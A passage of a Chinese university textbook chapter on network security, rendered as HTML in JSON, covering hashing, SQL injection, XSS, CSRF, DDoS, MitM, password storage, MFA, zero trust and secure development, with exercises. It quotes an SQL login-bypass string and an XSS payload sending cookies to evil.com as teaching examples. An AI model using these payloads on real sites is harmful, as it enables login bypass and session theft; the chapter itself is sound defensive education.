style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0813em;\">H</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0813em;\">H</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></li>\n</ul>\n<p>SHA-256 输出 256 位摘要，生日攻击需要约 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mn>2</mn><mn>128</mn></msup></mrow><annotation encoding=\"application/x-tex\">2^{128}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">128</span></span></span></span></span></span></span></span></span></span></span></span></span> 次哈希运算才能找到碰撞。SHA-1（160 位）已被 Google 团队在 2017 年实际碰撞（SHAttered 攻击），不应再用于安全场景。</p>\n<h3 id=\"web-应用安全\">Web 应用安全</h3><p>Web 应用是最常见的攻击面。OWASP Top 10 列出了最关键的 Web 安全风险：</p>\n<p><strong>SQL 注入</strong>（SQLi）：攻击者在输入中嵌入 SQL 代码，当应用使用字符串拼接构造查询时，恶意输入被当作 SQL 执行。例如输入 <code>&#39; OR &#39;1&#39;=&#39;1</code> 可绕过登录验证。防御手段：<strong>参数化查询</strong>（Prepared Statement）将数据和代码分离，从根本上杜绝注入。</p>\n<p><strong>跨站脚本</strong>（XSS）：攻击者在 Web 页面中注入恶意 JavaScript 代码，当其他用户浏览该页面时代码自动执行，可以窃取 Cookie、会话令牌等。分为存储型（恶意脚本存入数据库）、反射型（通过 URL 参数触发）和 DOM 型（客户端 JavaScript 操作不当）。防御：<strong>输出编码</strong>（HTML Entity Encoding）和 <strong>Content Security Policy</strong>（CSP）头。</p>\n<p><strong>跨站请求伪造</strong>（CSRF）：利用用户已认证的会话，诱使用户浏览器向目标网站发送伪造请求。防御：<strong>CSRF Token</strong>（在表单中嵌入随机令牌并在服务端验证）和 <strong>SameSite Cookie 属性</strong>。</p>\n<h3 id=\"网络攻击与防御\">网络攻击与防御</h3><p><strong>分布式拒绝服务</strong>（DDoS）攻击通过大量恶意流量淹没目标服务器，使其无法为正常用户提供服务。攻击类型包括：</p>\n<ul>\n<li><strong>Volume-based</strong>：UDP 洪泛、DNS 放大。DNS 放大攻击的放大系数可达 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>50</mn><mtext>-</mtext><mn>70</mn><mo>×</mo></mrow><annotation encoding=\"application/x-tex\">50\\text{-}70\\times</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">50</span><span class=\"mord text\"><span class=\"mord\">-</span></span><span class=\"mord\">70</span><span class=\"mord\">×</span></span></span></span></span>——攻击者发送伪造源 IP 的小 DNS 查询，权威服务器向受害者返回大量响应。</li>\n<li><strong>Protocol-based</strong>：SYN 洪泛（利用 TCP 三次握手的半开连接占满服务器资源）</li>\n<li><strong>Application-layer</strong>：HTTP 洪泛、Slowloris（缓慢发送 HTTP 请求头，占用连接不释放）</li>\n</ul>\n<p>防御措施包括：CDN 分流、速率限制、SYN Cookie（无状态处理 SYN 请求）和 BGP 流量清洗。</p>\n<p><strong>中间人攻击</strong>（MitM）：攻击者在通信双方之间截获和可能修改数据。TLS/HTTPS 通过<strong>证书认证</strong>和<strong>密钥协商</strong>防止 MitM——浏览器验证服务器证书是否由受信任的 CA 签发，HSTS（HTTP Strict Transport Security）强制使用 HTTPS。</p>\n<h3 id=\"认证与访问控制\">认证与访问控制</h3><p><strong>认证</strong>（Authentication）验证&quot;你是谁&quot;，<strong>授权</strong>（Authorization）决定&quot;你能做什么&quot;。</p>\n<p><strong>密码安全</strong>：密码不应以明文存储，而应使用<strong>慢哈希函数</strong>（如 bcrypt、Argon2）加盐存储。bcrypt 的计算代价参数（cost factor）使得暴力破解成本极高：</p>\n<div class=\"math-block\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mtext>bcrypt</mtext><mo stretchy=\"false\">(</mo><mtext>salt</mtext><mo separator=\"true\">,</mo><mtext>password</mtext><mo separator=\"true\">,</mo><mtext>cost</mtext><mo stretchy=\"false\">)</mo><mo>→</mo><mtext>hash</mtext></mrow><annotation encoding=\"application/x-tex\">\\text{bcrypt}(\\text{salt}, \\text{password}, \\text{cost}) \\to \\text{hash}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord text\"><span class=\"mord\">bcrypt</span></span><span class=\"mopen\">(</span><span class=\"mord text\"><span class=\"mord\">salt</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord text\"><span class=\"mord\">password</span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord text\"><span class=\"mord\">cost</span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord text\"><span class=\"mord\">hash</span></span></span></span></span></span></div><p>当 cost <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>=</mo><mn>12</mn></mrow><annotation encoding=\"application/x-tex\">= 12</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.3669em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">12</span></span></span></span></span> 时，单次哈希约需 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>250</mn><mtext>  </mtext><mtext>ms</mtext></mrow><annotation encoding=\"application/x-tex\">250\\;\\text{ms}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">250</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord text\"><span class=\"mord\">ms</span></span></span></span></span></span>，使得彩虹表和在线暴力破解均不可行。</p>\n<p><strong>多因素认证</strong>（MFA）要求至少两类认证因素：</p>\n<ul>\n<li>知识因素：密码、PIN</li>\n<li>持有因素：手机（OTP）、硬件密钥（YubiKey）</li>\n<li>生物特征：指纹、面部识别</li>\n</ul>\n<p><strong>零信任架构</strong>（Zero Trust）的核心原则是&quot;永远不信任，始终验证&quot;。与传统的边界安全模型（内网可信、外网不可信）不同，零信任假设网络已被渗透，对每次访问请求都进行身份验证、设备检查和最小权限授权。BeyondCorp（Google）是零信任架构的先驱实践。</p>\n<h3 id=\"安全开发生命周期\">安全开发生命周期</h3><p>将安全融入软件开发的全过程（Shift Left Security）：</p>\n<ul>\n<li><strong>需求阶段</strong>：威胁建模（STRIDE 模型）识别潜在攻击面</li>\n<li><strong>设计阶段</strong>：安全架构审查，最小权限原则</li>\n<li><strong>编码阶段</strong>：安全编码规范，静态分析（SAST）工具扫描</li>\n<li><strong>测试阶段</strong>：动态分析（DAST）、渗透测试、模糊测试（Fuzzing）</li>\n<li><strong>部署阶段</strong>：容器镜像扫描、依赖漏洞检查（SCA）</li>\n<li><strong>运营阶段</strong>：日志监控、入侵检测（IDS）、事件响应</li>\n</ul>\n<p><strong>模糊测试</strong>通过向程序输入大量随机或半随机数据来发现崩溃和漏洞。AFL（American Fuzzy Lop）是最知名的覆盖引导模糊器，通过代码覆盖率反馈指导输入变异，已在 OpenSSL、SQLite 等关键软件中发现数百个漏洞。</p>\n<h2 id=\"练习与思考\">练习与思考</h2><ol>\n<li><p>解释 AES-GCM 和 AES-CBC 在安全性上的差异。为什么 CBC 模式需要额外的 MAC（如 HMAC）来保证完整性，而 GCM 不需要？什么是 Padding Oracle 攻击？</p>\n</li>\n<li><p>给定一个 Web 应用的登录接口，其后端 SQL 查询为 <code>SELECT * FROM users WHERE username=&#39;$input&#39; AND password=&#39;$pass&#39;</code>。构造一个 SQL 注入 payload 使其绕过认证。然后说明参数化查询如何防止此攻击。</p>\n</li>\n<li><p>某网站允许用户在评论中输入 HTML。攻击者提交了 <code>&lt;script&gt;document.location=&#39;https://evil.com/steal?cookie=&#39;+document.cookie&lt;/script&gt;</code>。(a) 这属于哪种类型的 XSS？(b) 列举三种防御措施并说明各自的防护层面。</p>\n</li>\n<li><p>比较 RSA-2048 和 Curve25519 在密钥长度、计算性能和抗量子计算能力方面的差异。为什么 NIST 正在推进后量子密码标准化？Kyber 和 Dilithium 分别解决什么问题？</p>\n</li>\n<li><p>设计一个简化的零信任访问控制流程：员工从个人笔记本电脑通过咖啡店 Wi-Fi 访问公司内部代码仓库。需要经过哪些验证步骤？与传统 VPN 方案相比有什么优势？</p>\n</li>\n</ol>\n<h2 id=\"拓展阅读\">拓展阅读</h2><ul>\n<li><strong>《Computer Security: Principles and Practice》</strong>（Stallings &amp; Brown）：网络安全领域的经典教材，覆盖密码学、网络安全、软件安全和管理安全。</li>\n<li><strong>《Cryptography and Network Security》</strong>（William Stallings）：密码学专项教材，从古典密码到现代公钥体系再到量子密码学。</li>\n<li><strong>OWASP Web Security Testing Guide</strong>（owasp.org）：Web 应用安全测试的权威指南，包含详细的测试方法和工具推荐。</li>\n<li><strong>CTF（Capture The Flag）竞赛平台</strong>：picoCTF（入门）、Hack The Box（进阶）是实践网络安全技能的最佳平台。</li>\n</ul>\n<h2 id=\"小结\">小结</h2><p>网络安全是一场持续的攻防对抗。密码学提供了机密性和完整性的数学保障，Web 应用安全关注代码级漏洞的消除，网络安全防御抵御从 DDoS 到中间人攻击的各类威胁，身份与访问管理确保只有正确的人能访问正确的资源。零信任架构代表了安全理念的范式转变——从基于边界的信任到基于持续验证的信任。安全不是一次性的产品，而是贯穿软件全生命周期的持续过程。对于计算机科学学习者，具备安全意识和基本的攻防知识，是编写可靠软件和构建安全系统的必备素养。</p>\n","headings":[{"level":1,"text":"大学计算机科学与技术 — 网络安全","id":"大学计算机科学与技术-网络安全"},{"level":2,"text":"知识要点","id":"知识要点"},{"level":2,"text":"详细讲解","id":"详细讲解"},{"level":3,"text":"密码学基础","id":"密码学基础"},{"level":3,"text":"Web 应用安全","id":"web-应用安全"},{"level":3,"text":"网络攻击与防御","id":"网络攻击与防御"},{"level":3,"text":"认证与访问控制","id":"认证与访问控制"},{"level":3,"text":"安全开发生命周期","id":"安全开发生命周期"},{"level":2,"text":"练习与思考","id":"练习与思考"},{"level":2,"text":"拓展阅读","id":"拓展阅读"},{"level":2,"text":"小结","id":"小结"}],"prev":{"title":"大学计算机科学与技术 — 云计算","url":"/l-doc-books/education/university/engineering/computer-science/emerging-technologies/cloud-computing"},"next":null}